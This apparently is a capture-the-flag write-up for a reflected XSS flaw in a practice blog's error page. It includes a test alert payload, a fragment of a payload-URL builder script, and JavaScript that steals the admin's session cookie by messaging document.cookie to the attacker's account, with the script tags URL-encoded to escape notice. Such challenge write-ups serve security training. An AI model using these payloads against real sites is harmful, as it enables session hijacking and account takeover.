Overview

The website https://obxssession.hackthe.space/ serves as a conspiracy blog. A the page https://obxssession.hackthe.space/error?m=theory is private&p=/theory/5 is inaccessible.

On this site one is able to register and send messages to other users aswell as the admin and look all of ones posts.

From the CTF Page we know the following things:

  • Please notice that the admin is very interested in new theories and they are periodically accessing their inbox clicking on links received by other members of the community. → Admin opens mails
  • Since they're paranoid, they're wearing a tinfoil hat all the time and they configured their computer to never access any other website aside from obxssession! → No CSRF

Vulnerability

Just by looking at the query parameters in the url of the page with the path /theory/5 it is immediately clear that there might be a vulnerability for XSS.

So we verify our hypothesis like so:

https://obxssession.hackthe.space/error?m=theory is private&p=<script>alert('whoopty!');</script>

        const url = 'https://obxssession.hackthe.space/error?m=theoryprivate&p=';
        const out = document.getElementById("output");

        const input = document.getElementById("input").addEventListener('change', function() {
            out.innerText = url + "<script\>" + this.value.replace(/ /g, "%20").replace(/\n/g,"").replace(/&/g, "%26").replace(/=/g, "%3D") + '\</script\>';
        })
        
    </script>
</body>

Exploitation

First we registered ourselves.

Step 1

We first observe the sent and recieved request bodies sent by our browser through the chrome developer tools to then use them in postman.exe.

Logging in:

  1. mail
  1. password

Sending messages:

  1. receiver (every user has a specific Id that can be seen in the HTML file. Mine was 141)
  1. subject
  1. contents

Payload:

var xhr = new XMLHttpRequest();
xhr.open("POST", "https://obxssession.hackthe.space/send", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send("receiver=141&subject=AAAAAAABBBBBBAAAAAAAA&contents=AAAAAAAAAAAAAAAAAAAAA");

Step 2

Now we must send a link with a payload placed in the URL to the admin so that he sends us his session cookie that authorizes him to access certain any page on this website.

Then we sent this link to the admin but figured out that we must hide script tags by encoding them through the URL encoding <%73%63%72%69%70%74> or else the admin finds out that we are trying to hack him.

We did this for any payload from this point onwards.

var xhr = new XMLHttpRequest();
xhr.open("POST", "https://obxssession.hackthe.space/send", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send(`receiver=141&subject=FUCK+LEETCODE+-+WE+DOIN+YEETCODE&contents=${document.cookie}`);
